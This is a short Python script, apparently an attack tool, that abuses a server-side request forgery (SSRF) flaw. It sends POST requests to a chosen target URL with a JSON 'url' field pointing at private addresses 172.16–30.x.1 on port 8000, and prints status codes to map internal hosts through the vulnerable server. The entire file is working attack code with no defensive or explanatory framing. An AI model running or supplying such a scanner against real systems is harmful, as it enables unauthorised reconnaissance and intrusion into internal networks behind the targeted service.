import argparse
import requests
import sys

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
#parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()

baseurl = args.target

timeout = float(args.timeout)

for y in range(16,31):
    for x in range(1,256):
        host = f"http://172.{y}.{x}.1"
        print(f"Trying host: {host}")
        try:
            r = requests.post(url=baseurl, json={"url":f"{host}:8000"}, timeout=timeout)
            print(r.status_code)
        except KeyboardInterrupt:
            sys.exit()
        except:
            print("Error")
            continue

